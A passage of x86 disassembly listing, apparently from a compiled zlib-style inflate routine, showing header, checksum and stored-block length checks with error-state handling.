  406b5e:	89 cb                	mov    %ecx,%ebx
  406b60:	8b 44 24 24          	mov    0x24(%esp),%eax
  406b64:	39 70 1c             	cmp    %esi,0x1c(%eax)
  406b67:	0f 84 60 0d 00 00    	je     0x4078cd
  406b6d:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  406b74:	c7 41 18 38 d7 40 00 	movl   $0x40d738,0x18(%ecx)
  406b7b:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  406b81:	b8 1d 00 00 00       	mov    $0x1d,%eax
  406b86:	e9 7e f1 ff ff       	jmp    0x405d09
  406b8b:	90                   	nop
  406b8c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406b90:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  406b94:	c7 44 24 38 fd ff ff 	movl   $0xfffffffd,0x38(%esp)
  406b9b:	ff 
  406b9c:	89 de                	mov    %ebx,%esi
  406b9e:	89 eb                	mov    %ebp,%ebx
  406ba0:	89 fd                	mov    %edi,%ebp
  406ba2:	8b 7c 24 24          	mov    0x24(%esp),%edi
  406ba6:	e9 a5 f7 ff ff       	jmp    0x406350
  406bab:	90                   	nop
  406bac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406bb0:	8b 44 24 24          	mov    0x24(%esp),%eax
  406bb4:	8b 50 10             	mov    0x10(%eax),%edx
  406bb7:	f6 c6 10             	test   $0x10,%dh
  406bba:	0f 84 9a fe ff ff    	je     0x406a5a
  406bc0:	85 ff                	test   %edi,%edi
  406bc2:	0f 84 38 f5 ff ff    	je     0x406100
  406bc8:	89 74 24 48          	mov    %esi,0x48(%esp)
  406bcc:	31 d2                	xor    %edx,%edx
  406bce:	89 6c 24 3c          	mov    %ebp,0x3c(%esp)
  406bd2:	89 7c 24 40          	mov    %edi,0x40(%esp)
  406bd6:	89 5c 24 54          	mov    %ebx,0x54(%esp)
  406bda:	8b 74 24 24          	mov    0x24(%esp),%esi
  406bde:	eb 06                	jmp    0x406be6
  406be0:	3b 54 24 40          	cmp    0x40(%esp),%edx
  406be4:	73 31                	jae    0x406c17
  406be6:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  406bea:	83 c2 01             	add    $0x1,%edx
  406bed:	0f b6 6c 10 ff       	movzbl -0x1(%eax,%edx,1),%ebp
  406bf2:	8b 46 20             	mov    0x20(%esi),%eax
  406bf5:	85 c0                	test   %eax,%eax
  406bf7:	89 e9                	mov    %ebp,%ecx
  406bf9:	74 18                	je     0x406c13
  406bfb:	8b 78 24             	mov    0x24(%eax),%edi
  406bfe:	85 ff                	test   %edi,%edi
  406c00:	74 11                	je     0x406c13
  406c02:	8b 5e 40             	mov    0x40(%esi),%ebx
  406c05:	3b 58 28             	cmp    0x28(%eax),%ebx
  406c08:	73 09                	jae    0x406c13
  406c0a:	8d 43 01             	lea    0x1(%ebx),%eax
  406c0d:	89 46 40             	mov    %eax,0x40(%esi)
  406c10:	88 0c 1f             	mov    %cl,(%edi,%ebx,1)
  406c13:	85 ed                	test   %ebp,%ebp
  406c15:	75 c9                	jne    0x406be0
  406c17:	8b 44 24 24          	mov    0x24(%esp),%eax
  406c1b:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  406c1f:	8b 7c 24 40          	mov    0x40(%esp),%edi
  406c23:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  406c27:	8b 74 24 48          	mov    0x48(%esp),%esi
  406c2b:	8b 5c 24 54          	mov    0x54(%esp),%ebx
  406c2f:	f6 40 11 02          	testb  $0x2,0x11(%eax)
  406c33:	0f 85 07 07 00 00    	jne    0x407340
  406c39:	8b 44 24 44          	mov    0x44(%esp),%eax
  406c3d:	29 d7                	sub    %edx,%edi
  406c3f:	01 d5                	add    %edx,%ebp
  406c41:	85 c0                	test   %eax,%eax
  406c43:	0f 85 b7 f4 ff ff    	jne    0x406100
  406c49:	8b 44 24 24          	mov    0x24(%esp),%eax
  406c4d:	8b 50 10             	mov    0x10(%eax),%edx
  406c50:	8b 44 24 24          	mov    0x24(%esp),%eax
  406c54:	c7 00 08 00 00 00    	movl   $0x8,(%eax)
  406c5a:	f6 c6 02             	test   $0x2,%dh
  406c5d:	0f 84 91 03 00 00    	je     0x406ff4
  406c63:	83 fb 0f             	cmp    $0xf,%ebx
  406c66:	77 2c                	ja     0x406c94
  406c68:	85 ff                	test   %edi,%edi
  406c6a:	0f 84 90 f4 ff ff    	je     0x406100
  406c70:	89 d9                	mov    %ebx,%ecx
  406c72:	eb 08                	jmp    0x406c7c
  406c74:	85 ff                	test   %edi,%edi
  406c76:	0f 84 54 03 00 00    	je     0x406fd0
  406c7c:	83 c5 01             	add    $0x1,%ebp
  406c7f:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406c83:	83 ef 01             	sub    $0x1,%edi
  406c86:	d3 e0                	shl    %cl,%eax
  406c88:	83 c1 08             	add    $0x8,%ecx
  406c8b:	01 c6                	add    %eax,%esi
  406c8d:	83 f9 0f             	cmp    $0xf,%ecx
  406c90:	76 e2                	jbe    0x406c74
  406c92:	89 cb                	mov    %ecx,%ebx
  406c94:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406c98:	0f b7 41 18          	movzwl 0x18(%ecx),%eax
  406c9c:	39 f0                	cmp    %esi,%eax
  406c9e:	0f 84 4c 03 00 00    	je     0x406ff0
  406ca4:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406cab:	c7 40 18 df d5 40 00 	movl   $0x40d5df,0x18(%eax)
  406cb2:	c7 01 1d 00 00 00    	movl   $0x1d,(%ecx)
  406cb8:	b8 1d 00 00 00       	mov    $0x1d,%eax
  406cbd:	e9 47 f0 ff ff       	jmp    0x405d09
  406cc2:	8b 44 24 24          	mov    0x24(%esp),%eax
  406cc6:	8b 50 10             	mov    0x10(%eax),%edx
  406cc9:	eb 8f                	jmp    0x406c5a
  406ccb:	90                   	nop
  406ccc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406cd0:	83 fb 0f             	cmp    $0xf,%ebx
  406cd3:	77 2c                	ja     0x406d01
  406cd5:	85 ff                	test   %edi,%edi
  406cd7:	0f 84 23 f4 ff ff    	je     0x406100
  406cdd:	89 d9                	mov    %ebx,%ecx
  406cdf:	eb 08                	jmp    0x406ce9
  406ce1:	85 ff                	test   %edi,%edi
  406ce3:	0f 84 e7 02 00 00    	je     0x406fd0
  406ce9:	83 c5 01             	add    $0x1,%ebp
  406cec:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406cf0:	83 ef 01             	sub    $0x1,%edi
  406cf3:	d3 e0                	shl    %cl,%eax
  406cf5:	83 c1 08             	add    $0x8,%ecx
  406cf8:	01 c6                	add    %eax,%esi
  406cfa:	83 f9 0f             	cmp    $0xf,%ecx
  406cfd:	76 e2                	jbe    0x406ce1
  406cff:	89 cb                	mov    %ecx,%ebx
  406d01:	8b 54 24 24          	mov    0x24(%esp),%edx
  406d05:	89 f0                	mov    %esi,%eax
  406d07:	3c 08                	cmp    $0x8,%al
  406d09:	89 72 10             	mov    %esi,0x10(%edx)
  406d0c:	0f 84 eb 08 00 00    	je     0x4075fd
  406d12:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406d19:	c7 40 18 97 d5 40 00 	movl   $0x40d597,0x18(%eax)
  406d20:	c7 02 1d 00 00 00    	movl   $0x1d,(%edx)
  406d26:	b8 1d 00 00 00       	mov    $0x1d,%eax
  406d2b:	e9 d9 ef ff ff       	jmp    0x405d09
  406d30:	8b 44 24 24          	mov    0x24(%esp),%eax
  406d34:	8b 50 08             	mov    0x8(%eax),%edx
  406d37:	85 d2                	test   %edx,%edx
  406d39:	0f 84 01 05 00 00    	je     0x407240
  406d3f:	83 fb 0f             	cmp    $0xf,%ebx
  406d42:	77 2c                	ja     0x406d70
  406d44:	85 ff                	test   %edi,%edi
  406d46:	0f 84 07 08 00 00    	je     0x407553
  406d4c:	89 d9                	mov    %ebx,%ecx
  406d4e:	eb 08                	jmp    0x406d58
  406d50:	85 ff                	test   %edi,%edi
  406d52:	0f 84 78 02 00 00    	je     0x406fd0
  406d58:	83 c5 01             	add    $0x1,%ebp
  406d5b:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406d5f:	83 ef 01             	sub    $0x1,%edi
  406d62:	d3 e0                	shl    %cl,%eax
  406d64:	83 c1 08             	add    $0x8,%ecx
  406d67:	01 c6                	add    %eax,%esi
  406d69:	83 f9 0f             	cmp    $0xf,%ecx
  406d6c:	76 e2                	jbe    0x406d50
  406d6e:	89 cb                	mov    %ecx,%ebx
  406d70:	81 fe 1f 8b 00 00    	cmp    $0x8b1f,%esi
  406d76:	75 09                	jne    0x406d81
  406d78:	f6 c2 02             	test   $0x2,%dl
  406d7b:	0f 85 d7 0b 00 00    	jne    0x407958
  406d81:	8b 44 24 24          	mov    0x24(%esp),%eax
  406d85:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  406d8c:	8b 40 20             	mov    0x20(%eax),%eax
  406d8f:	85 c0                	test   %eax,%eax
  406d91:	74 07                	je     0x406d9a
  406d93:	c7 40 30 ff ff ff ff 	movl   $0xffffffff,0x30(%eax)
  406d9a:	83 e2 01             	and    $0x1,%edx
  406d9d:	0f 84 07 07 00 00    	je     0x4074aa
  406da3:	89 f0                	mov    %esi,%eax
  406da5:	89 f1                	mov    %esi,%ecx
  406da7:	ba 85 10 42 08       	mov    $0x8421085,%edx
  406dac:	c1 e0 08             	shl    $0x8,%eax
  406daf:	c1 e9 08             	shr    $0x8,%ecx
  406db2:	0f b7 c0             	movzwl %ax,%eax
  406db5:	01 c1                	add    %eax,%ecx
  406db7:	89 c8                	mov    %ecx,%eax
  406db9:	f7 e2                	mul    %edx
  406dbb:	89 c8                	mov    %ecx,%eax
  406dbd:	29 d0                	sub    %edx,%eax
  406dbf:	d1 e8                	shr    $1,%eax
  406dc1:	01 d0                	add    %edx,%eax
  406dc3:	c1 e8 04             	shr    $0x4,%eax
  406dc6:	89 c2                	mov    %eax,%edx
  406dc8:	c1 e2 05             	shl    $0x5,%edx
  406dcb:	29 c2                	sub    %eax,%edx
  406dcd:	39 d1                	cmp    %edx,%ecx
  406dcf:	0f 85 d5 06 00 00    	jne    0x4074aa
  406dd5:	89 f0                	mov    %esi,%eax
  406dd7:	83 e0 0f             	and    $0xf,%eax
  406dda:	83 f8 08             	cmp    $0x8,%eax
  406ddd:	0f 84 01 0b 00 00    	je     0x4078e4
  406de3:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406dea:	c7 40 18 97 d5 40 00 	movl   $0x40d597,0x18(%eax)
  406df1:	8b 44 24 24          	mov    0x24(%esp),%eax
  406df5:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  406dfb:	b8 1d 00 00 00       	mov    $0x1d,%eax
  406e00:	e9 04 ef ff ff       	jmp    0x405d09
  406e05:	89 d9                	mov    %ebx,%ecx
  406e07:	83 e3 f8             	and    $0xfffffff8,%ebx
  406e0a:	83 e1 07             	and    $0x7,%ecx
  406e0d:	d3 ee                	shr    %cl,%esi
  406e0f:	83 fb 1f             	cmp    $0x1f,%ebx
  406e12:	77 2c                	ja     0x406e40
  406e14:	85 ff                	test   %edi,%edi
  406e16:	0f 84 e4 f2 ff ff    	je     0x406100
  406e1c:	89 d9                	mov    %ebx,%ecx
  406e1e:	eb 08                	jmp    0x406e28
  406e20:	85 ff                	test   %edi,%edi
  406e22:	0f 84 a8 01 00 00    	je     0x406fd0
  406e28:	83 c5 01             	add    $0x1,%ebp
  406e2b:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406e2f:	83 ef 01             	sub    $0x1,%edi
  406e32:	d3 e0                	shl    %cl,%eax
  406e34:	83 c1 08             	add    $0x8,%ecx
  406e37:	01 c6                	add    %eax,%esi
  406e39:	83 f9 1f             	cmp    $0x1f,%ecx
  406e3c:	76 e2                	jbe    0x406e20
  406e3e:	89 cb                	mov    %ecx,%ebx
  406e40:	89 f2                	mov    %esi,%edx
  406e42:	0f b7 c6             	movzwl %si,%eax
  406e45:	c1 ea 10             	shr    $0x10,%edx
  406e48:	81 f2 ff ff 00 00    	xor    $0xffff,%edx
  406e4e:	39 d0                	cmp    %edx,%eax
  406e50:	0f 84 83 07 00 00    	je     0x4075d9
  406e56:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406e5d:	c7 40 18 06 d6 40 00 	movl   $0x40d606,0x18(%eax)
  406e64:	8b 44 24 24          	mov    0x24(%esp),%eax
  406e68:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  406e6e:	b8 1d 00 00 00       	mov    $0x1d,%eax
  406e73:	e9 91 ee ff ff       	jmp    0x405d09
  406e78:	90                   	nop
  406e79:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406e80:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  406e84:	85 c9                	test   %ecx,%ecx
  406e86:	0f 84 74 f2 ff ff    	je     0x406100
  406e8c:	8b 44 24 24          	mov    0x24(%esp),%eax
  406e90:	8b 54 24 30          	mov    0x30(%esp),%edx
  406e94:	8b 40 40             	mov    0x40(%eax),%eax
  406e97:	88 02                	mov    %al,(%edx)
  406e99:	89 c8                	mov    %ecx,%eax
  406e9b:	83 e8 01             	sub    $0x1,%eax
  406e9e:	89 44 24 28          	mov    %eax,0x28(%esp)
  406ea2:	8b 44 24 24          	mov    0x24(%esp),%eax
  406ea6:	c7 00 14 00 00 00    	movl   $0x14,(%eax)
  406eac:	8d 42 01             	lea    0x1(%edx),%eax
  406eaf:	89 44 24 30          	mov    %eax,0x30(%esp)
  406eb3:	b8 14 00 00 00       	mov    $0x14,%eax
  406eb8:	e9 4c ee ff ff       	jmp    0x405d09
  406ebd:	8d 76 00             	lea    0x0(%esi),%esi
  406ec0:	8b 44 24 24          	mov    0x24(%esp),%eax
  406ec4:	8b 40 08             	mov    0x8(%eax),%eax
  406ec7:	85 c0                	test   %eax,%eax
  406ec9:	0f 84 61 03 00 00    	je     0x407230
  406ecf:	83 fb 1f             	cmp    $0x1f,%ebx
  406ed2:	77 2c                	ja     0x406f00
  406ed4:	85 ff                	test   %edi,%edi
  406ed6:	0f 84 24 f2 ff ff    	je     0x406100
  406edc:	89 d9                	mov    %ebx,%ecx
  406ede:	eb 08                	jmp    0x406ee8
  406ee0:	85 ff                	test   %edi,%edi
  406ee2:	0f 84 e8 00 00 00    	je     0x406fd0
  406ee8:	83 c5 01             	add    $0x1,%ebp
  406eeb:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406eef:	83 ef 01             	sub    $0x1,%edi
  406ef2:	d3 e0                	shl    %cl,%eax
  406ef4:	83 c1 08             	add    $0x8,%ecx
  406ef7:	01 c6                	add    %eax,%esi
  406ef9:	83 f9 1f             	cmp    $0x1f,%ecx
  406efc:	76 e2                	jbe    0x406ee0
  406efe:	89 cb                	mov    %ecx,%ebx
  406f00:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  406f04:	2b 44 24 28          	sub    0x28(%esp),%eax
  406f08:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  406f0f:	8b 54 24 24          	mov    0x24(%esp),%edx
  406f13:	01 41 14             	add    %eax,0x14(%ecx)
  406f16:	01 42 1c             	add    %eax,0x1c(%edx)
  406f19:	85 c0                	test   %eax,%eax
  406f1b:	74 39                	je     0x406f56
  406f1d:	8b 52 10             	mov    0x10(%edx),%edx
  406f20:	89 44 24 08          	mov    %eax,0x8(%esp)
  406f24:	85 d2                	test   %edx,%edx
  406f26:	8b 54 24 30          	mov    0x30(%esp),%edx
  406f2a:	0f 84 99 08 00 00    	je     0x4077c9
  406f30:	29 c2                	sub    %eax,%edx
  406f32:	8b 44 24 24          	mov    0x24(%esp),%eax
  406f36:	89 54 24 04          	mov    %edx,0x4(%esp)
  406f3a:	8b 40 18             	mov    0x18(%eax),%eax
  406f3d:	89 04 24             	mov    %eax,(%esp)
  406f40:	e8 7b 17 00 00       	call   0x4086c0
  406f45:	8b 54 24 24          	mov    0x24(%esp),%edx
  406f49:	89 42 18             	mov    %eax,0x18(%edx)
  406f4c:	8b 94 24 90 00 00 00 	mov    0x90(%esp),%edx
  406f53:	89 42 30             	mov    %eax,0x30(%edx)
  406f56:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406f5a:	89 f0                	mov    %esi,%eax
  406f5c:	8b 49 10             	mov    0x10(%ecx),%ecx
  406f5f:	85 c9                	test   %ecx,%ecx
  406f61:	75 22                	jne    0x406f85
  406f63:	89 f2                	mov    %esi,%edx
  406f65:	c1 e8 18             	shr    $0x18,%eax
  406f68:	c1 e2 18             	shl    $0x18,%edx
  406f6b:	01 c2                	add    %eax,%edx
  406f6d:	89 f0                	mov    %esi,%eax
  406f6f:	c1 e8 08             	shr    $0x8,%eax
  406f72:	25 00 ff 00 00       	and    $0xff00,%eax
  406f77:	01 c2                	add    %eax,%edx
  406f79:	89 f0                	mov    %esi,%eax
  406f7b:	25 00 ff 00 00       	and    $0xff00,%eax
  406f80:	c1 e0 08             	shl    $0x8,%eax
  406f83:	01 d0                	add    %edx,%eax
  406f85:	8b 54 24 24          	mov    0x24(%esp),%edx
  406f89:	3b 42 18             	cmp    0x18(%edx),%eax
  406f8c:	0f 84 8a 02 00 00    	je     0x40721c
  406f92:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406f99:	c7 40 18 23 d7 40 00 	movl   $0x40d723,0x18(%eax)
  406fa0:	8b 44 24 24          	mov    0x24(%esp),%eax
  406fa4:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  406faa:	8b 44 24 28          	mov    0x28(%esp),%eax
  406fae:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  406fb2:	b8 1d 00 00 00       	mov    $0x1d,%eax
  406fb7:	e9 4d ed ff ff       	jmp    0x405d09
  406fbc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406fc0:	ba 00 01 00 00       	mov    $0x100,%edx
  406fc5:	e9 80 f4 ff ff       	jmp    0x40644a
  406fca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  406fd0:	89 eb                	mov    %ebp,%ebx
  406fd2:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  406fd6:	89 fd                	mov    %edi,%ebp
  406fd8:	89 ce                	mov    %ecx,%esi
  406fda:	8b 7c 24 24          	mov    0x24(%esp),%edi
  406fde:	e9 6d f3 ff ff       	jmp    0x406350
  406fe3:	83 e8 80             	sub    $0xffffff80,%eax
  406fe6:	e9 5d f4 ff ff       	jmp    0x406448
  406feb:	90                   	nop
  406fec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406ff0:	31 db                	xor    %ebx,%ebx
  406ff2:	31 f6                	xor    %esi,%esi
  406ff4:	8b 44 24 24          	mov    0x24(%esp),%eax
  406ff8:	8b 40 20             	mov    0x20(%eax),%eax
  406ffb:	85 c0                	test   %eax,%eax
  406ffd:	74 10                	je     0x40700f
  406fff:	c1 fa 09             	sar    $0x9,%edx
  407002:	c7 40 30 01 00 00 00 	movl   $0x1,0x30(%eax)
  407009:	83 e2 01             	and    $0x1,%edx
  40700c:	89 50 2c             	mov    %edx,0x2c(%eax)
  40700f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  407016:	00 
  407017:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40701e:	00 
  40701f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  407026:	e8 95 16 00 00       	call   0x4086c0
  40702b:	8b 54 24 24          	mov    0x24(%esp),%edx
  40702f:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  407036:	89 42 18             	mov    %eax,0x18(%edx)
  407039:	89 41 30             	mov    %eax,0x30(%ecx)
  40703c:	b8 0b 00 00 00       	mov    $0xb,%eax
  407041:	c7 02 0b 00 00 00    	movl   $0xb,(%edx)
  407047:	e9 bd ec ff ff       	jmp    0x405d09
  40704c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407050:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407057:	8b 40 04             	mov    0x4(%eax),%eax
  40705a:	85 c0                	test   %eax,%eax
  40705c:	75 36                	jne    0x407094
  40705e:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  407065:	00 
  407066:	e9 44 ec ff ff       	jmp    0x405caf
  40706b:	90                   	nop
  40706c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407070:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407077:	8b 40 0c             	mov    0xc(%eax),%eax
  40707a:	89 44 24 24          	mov    %eax,0x24(%esp)
  40707e:	29 f0                	sub    %esi,%eax
  407080:	89 44 24 04          	mov    %eax,0x4(%esp)
  407084:	8b 47 18             	mov    0x18(%edi),%eax
  407087:	89 04 24             	mov    %eax,(%esp)
  40708a:	e8 e1 10 00 00       	call   0x408170
  40708f:	e9 7c f3 ff ff       	jmp    0x406410
  407094:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407099:	e9 87 f2 ff ff       	jmp    0x406325
  40709e:	66 90                	xchg   %ax,%ax
  4070a0:	8b 44 24 24          	mov    0x24(%esp),%eax
  4070a4:	c7 00 0b 00 00 00    	movl   $0xb,(%eax)
  4070aa:	b8 0b 00 00 00       	mov    $0xb,%eax
  4070af:	e9 55 ec ff ff       	jmp    0x405d09
  4070b4:	8b 44 24 30          	mov    0x30(%esp),%eax
  4070b8:	29 c8                	sub    %ecx,%eax
  4070ba:	89 44 24 40          	mov    %eax,0x40(%esp)
  4070be:	8b 44 24 24          	mov    0x24(%esp),%eax
  4070c2:	8b 48 40             	mov    0x40(%eax),%ecx
  4070c5:	89 ca                	mov    %ecx,%edx
  4070c7:	8b 44 24 28          	mov    0x28(%esp),%eax
  4070cb:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  4070cf:	39 c1                	cmp    %eax,%ecx
  4070d1:	0f 47 c8             	cmova  %eax,%ecx
  4070d4:	29 c8                	sub    %ecx,%eax
  4070d6:	29 ca                	sub    %ecx,%edx
  4070d8:	89 44 24 28          	mov    %eax,0x28(%esp)
  4070dc:	8b 44 24 24          	mov    0x24(%esp),%eax
  4070e0:	89 50 40             	mov    %edx,0x40(%eax)
  4070e3:	8b 54 24 30          	mov    0x30(%esp),%edx
  4070e7:	8b 44 24 40          	mov    0x40(%esp),%eax
  4070eb:	01 d1                	add    %edx,%ecx
  4070ed:	8d 76 00             	lea    0x0(%esi),%esi
  4070f0:	83 c0 01             	add    $0x1,%eax
  4070f3:	0f b6 58 ff          	movzbl -0x1(%eax),%ebx
  4070f7:	83 c2 01             	add    $0x1,%edx
  4070fa:	39 ca                	cmp    %ecx,%edx
  4070fc:	88 5a ff             	mov    %bl,-0x1(%edx)
  4070ff:	75 ef                	jne    0x4070f0
  407101:	8b 44 24 24          	mov    0x24(%esp),%eax
  407105:	89 54 24 30          	mov    %edx,0x30(%esp)
  407109:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  40710d:	8b 48 40             	mov    0x40(%eax),%ecx
  407110:	85 c9                	test   %ecx,%ecx
  407112:	74 0c                	je     0x407120
  407114:	8b 00                	mov    (%eax),%eax
  407116:	e9 e5 eb ff ff       	jmp    0x405d00
  40711b:	90                   	nop
  40711c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407120:	8b 44 24 24          	mov    0x24(%esp),%eax
  407124:	c7 00 14 00 00 00    	movl   $0x14,(%eax)
  40712a:	b8 14 00 00 00       	mov    $0x14,%eax
  40712f:	e9 d5 eb ff ff       	jmp    0x405d09
  407134:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  40713b:	8b 54 24 30          	mov    0x30(%esp),%edx
  40713f:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  407143:	89 28                	mov    %ebp,(%eax)
  407145:	89 78 04             	mov    %edi,0x4(%eax)
  407148:	89 50 0c             	mov    %edx,0xc(%eax)
  40714b:	89 48 10             	mov    %ecx,0x10(%eax)
  40714e:	8b 44 24 24          	mov    0x24(%esp),%eax
  407152:	89 70 38             	mov    %esi,0x38(%eax)
  407155:	89 58 3c             	mov    %ebx,0x3c(%eax)
  407158:	89 c6                	mov    %eax,%esi
  40715a:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40715e:	89 44 24 04          	mov    %eax,0x4(%esp)
  407162:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407169:	89 04 24             	mov    %eax,(%esp)
  40716c:	e8 0f 1e 00 00       	call   0x408f80
  407171:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407178:	8b 40 0c             	mov    0xc(%eax),%eax
  40717b:	89 44 24 30          	mov    %eax,0x30(%esp)
  40717f:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407186:	8b 40 10             	mov    0x10(%eax),%eax
  407189:	89 44 24 28          	mov    %eax,0x28(%esp)
  40718d:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407194:	8b 28                	mov    (%eax),%ebp
  407196:	8b 78 04             	mov    0x4(%eax),%edi
  407199:	89 f0                	mov    %esi,%eax
  40719b:	8b 58 3c             	mov    0x3c(%eax),%ebx
  40719e:	8b 00                	mov    (%eax),%eax
  4071a0:	8b 76 38             	mov    0x38(%esi),%esi
  4071a3:	83 f8 0b             	cmp    $0xb,%eax
  4071a6:	0f 85 54 eb ff ff    	jne    0x405d00
  4071ac:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4071b0:	c7 81 c4 1b 00 00 ff 	movl   $0xffffffff,0x1bc4(%ecx)
  4071b7:	ff ff ff 
  4071ba:	e9 4a eb ff ff       	jmp    0x405d09
  4071bf:	90                   	nop
  4071c0:	39 d3                	cmp    %edx,%ebx
  4071c2:	73 2b                	jae    0x4071ef
  4071c4:	85 ff                	test   %edi,%edi
  4071c6:	0f 84 34 ef ff ff    	je     0x406100
  4071cc:	89 d9                	mov    %ebx,%ecx
  4071ce:	eb 08                	jmp    0x4071d8
  4071d0:	85 ff                	test   %edi,%edi
  4071d2:	0f 84 f8 fd ff ff    	je     0x406fd0
  4071d8:	83 c5 01             	add    $0x1,%ebp
  4071db:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  4071df:	83 ef 01             	sub    $0x1,%edi
  4071e2:	d3 e0                	shl    %cl,%eax
  4071e4:	83 c1 08             	add    $0x8,%ecx
  4071e7:	01 c6                	add    %eax,%esi
  4071e9:	39 d1                	cmp    %edx,%ecx
  4071eb:	72 e3                	jb     0x4071d0
  4071ed:	89 cb                	mov    %ecx,%ebx
  4071ef:	89 d1                	mov    %edx,%ecx
  4071f1:	b8 01 00 00 00       	mov    $0x1,%eax
  4071f6:	29 d3                	sub    %edx,%ebx
  4071f8:	d3 e0                	shl    %cl,%eax
  4071fa:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4071fe:	83 e8 01             	sub    $0x1,%eax
  407201:	21 f0                	and    %esi,%eax
  407203:	03 41 40             	add    0x40(%ecx),%eax
  407206:	89 41 40             	mov    %eax,0x40(%ecx)
  407209:	89 d1                	mov    %edx,%ecx
  40720b:	d3 ee                	shr    %cl,%esi
  40720d:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  407211:	01 91 c4 1b 00 00    	add    %edx,0x1bc4(%ecx)
  407217:	e9 0d ef ff ff       	jmp    0x406129
  40721c:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  407220:	8b 42 08             	mov    0x8(%edx),%eax
  407223:	31 f6                	xor    %esi,%esi
  407225:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  407229:	31 db                	xor    %ebx,%ebx
  40722b:	90                   	nop
  40722c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407230:	8b 54 24 24          	mov    0x24(%esp),%edx
  407234:	c7 02 1b 00 00 00    	movl   $0x1b,(%edx)
  40723a:	e9 d8 f8 ff ff       	jmp    0x406b17
  40723f:	90                   	nop
  407240:	8b 44 24 24          	mov    0x24(%esp),%eax
  407244:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  40724a:	b8 0c 00 00 00       	mov    $0xc,%eax
  40724f:	e9 b5 ea ff ff       	jmp    0x405d09
  407254:	8b 80 c0 1b 00 00    	mov    0x1bc0(%eax),%eax
  40725a:	85 c0                	test   %eax,%eax
  40725c:	0f 84 bc ec ff ff    	je     0x405f1e
  407262:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407269:	c7 40 18 05 d7 40 00 	movl   $0x40d705,0x18(%eax)
  407270:	8b 44 24 24          	mov    0x24(%esp),%eax
  407274:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  40727a:	b8 1d 00 00 00       	mov    $0x1d,%eax
  40727f:	e9 85 ea ff ff       	jmp    0x405d09
  407284:	8b 54 24 24          	mov    0x24(%esp),%edx
  407288:	8b 92 c4 1b 00 00    	mov    0x1bc4(%edx),%edx
  40728e:	89 c1                	mov    %eax,%ecx
  407290:	29 c3                	sub    %eax,%ebx
  407292:	01 d0                	add    %edx,%eax
  407294:	d3 ee                	shr    %cl,%esi
  407296:	f6 44 24 3c 40       	testb  $0x40,0x3c(%esp)
  40729b:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40729f:	89 81 c4 1b 00 00    	mov    %eax,0x1bc4(%ecx)
  4072a5:	0f 84 57 01 00 00    	je     0x407402
  4072ab:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4072b2:	c7 40 18 ef d6 40 00 	movl   $0x40d6ef,0x18(%eax)
